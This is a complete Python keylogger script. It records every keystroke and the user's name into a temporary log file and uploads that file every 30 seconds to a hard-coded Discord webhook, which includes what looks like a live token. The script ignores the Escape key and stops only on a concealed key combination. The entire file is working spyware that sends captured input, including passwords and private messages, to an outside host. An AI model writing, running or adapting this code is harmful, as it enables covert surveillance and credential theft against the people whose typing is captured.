import os
import tempfile
import requests
import threading
import getpass
import sys
from pynput import keyboard
import time

# Get the name of the user signed in
user_name = getpass.getuser()

# Create a temporary directory and a log file named "log.txt" within it
temp_dir = tempfile.gettempdir()
log_path = os.path.join(temp_dir, 'log.txt')

# Create and initialize the log file
with open(log_path, 'w') as log_file:
    log_file.write('')

# Your Discord webhook URL
webhook_url = 'https://discord.com/api/webhooks/1272625926668292136/LL8hTxV9YTcY6Qkbc_KZhn2BXVufmLDGAbM0m1m28kbK8cvwlcakiwViAQtrMKO_BA95'

# Initialize the idle time counter starting at 30 seconds
idle_time = 30

# Variables to track the key combination
key_set = set()
key_count = 0
desired_keys = {'\\', '[', '`'}
key_timer = None
log_timer = None

# Function to reset key tracking variables
def reset_key_tracking():
    global key_set, key_count, key_timer
    key_set.clear()
    key_count = 0
    key_timer = None

# Function to handle key press events
def on_press(key):
    global idle_time, key_set, key_count, key_timer
    idle_time = 30  # Reset idle time to 30 seconds on key press
    try:
        with open(log_path, 'a') as f:
            f.write(f'{key}')
            if key.char in desired_keys:
                key_set.add(key.char)
                key_count += 1
    except AttributeError:
        with open(log_path, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f'[{key}]')
                if key == keyboard.Key.backslash:
                    key_set.add('\\')
                    key_count += 1
                elif key == keyboard.Key.bracket_left:
                    key_set.add('[')
                    key_count += 1
                elif key == keyboard.Key.grave:
                    key_set.add('`')
                    key_count += 1

    # Start or reset the timer
    if key_timer is None:
        key_timer = threading.Timer(2, reset_key_tracking)
        key_timer.start()
    else:
        key_timer.cancel()
        key_timer = threading.Timer(2, reset_key_tracking)
        key_timer.start()

    # Check if the desired keys are pressed twice
    if key_set == desired_keys and key_count >= 6:
        stop_keylogger()

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Ignore the Escape key to prevent stopping the listener
        return

# Function to stop the keylogger
def stop_keylogger():
    global log_timer
    print('Desired key combination detected. Stopping keylogger...')
    if log_timer:
        log_timer.cancel()
    listener.stop()
    sys.exit(0)

# Function to send the log file to Discord
def send_log_to_discord():
    global idle_time, log_timer
    try:
        if os.path.getsize(log_path) == 0:
            message = f"Nothing typed in {idle_time} seconds by {user_name}"
            data = {
                "content": message
            }
            response = requests.post(webhook_url, json=data)
            if response.status_code == 200:
                print('Idle message sent successfully.')
            else:
                print(f'Failed to send idle message. Status code: {response.status_code}')
            idle_time += 30
        else:
            with open(log_path, 'rb') as f:
                files = {
                    'file': (os.path.basename(log_path), f)
                }
                response = requests.post(webhook_url, files=files)
                if response.status_code == 200:
                    print('Log file sent successfully.')
                else:
                    print(f'Failed to send log file. Status code: {response.status_code}')
            # Clear the log file
            open(log_path, 'w').close()
            idle_time = 30  # Reset idle time to 30 seconds after sending log

        # Schedule the next call to this function
        log_timer = threading.Timer(30, send_log_to_discord)
        log_timer.start()
    except RuntimeError as e:
        if 'interpreter shutdown' in str(e):
            print('Interpreter is shutting down, cannot start new thread.')
        else:
            raise

# Start the keyboard listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# Schedule the first log sending after 30 seconds
log_timer = threading.Timer(30, send_log_to_discord)
log_timer.start()

# Print the path to the temporary file
print(f'Keystrokes are being logged to: {log_path}')

# Keep the script running
listener.join()
